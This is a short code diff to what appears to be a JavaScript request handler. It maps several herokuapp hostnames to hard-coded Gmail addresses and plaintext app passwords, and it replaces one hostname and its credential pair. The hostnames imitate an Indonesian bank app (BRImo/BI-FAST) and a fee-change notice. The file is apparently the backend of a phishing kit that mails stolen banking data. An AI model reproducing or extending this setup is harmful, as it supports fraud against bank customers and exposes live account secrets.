@@ -12,9 +12,9 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'ubah-tarif.herokuapp.com'){
-        email = 'alamalam312zx@gmail.com' ;
-        pass = 'kgyvskkowvhosxrj' ;
+    } else if(url == 'tarif-ubah.herokuapp.com'){
+        email = 'andin1234zx@gmail.com' ;
+        pass = 'qtqigmxdxvlcgdug' ;
 
     } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
         email = 'brigacor80@gmail.com';
